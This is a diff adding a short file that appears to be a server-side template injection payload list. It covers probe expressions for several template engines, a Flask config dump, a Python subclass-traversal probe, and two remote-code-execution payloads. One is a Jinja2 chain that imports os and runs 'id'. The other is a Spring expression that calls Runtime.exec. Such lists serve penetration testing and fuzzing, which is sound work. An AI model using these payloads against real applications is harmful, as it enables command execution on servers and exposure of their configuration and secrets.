@@ -1,0 +1,11 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+#{7*7}
+*{7*7}
+{{ 7 * 7 }}
+[[7*7]]
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
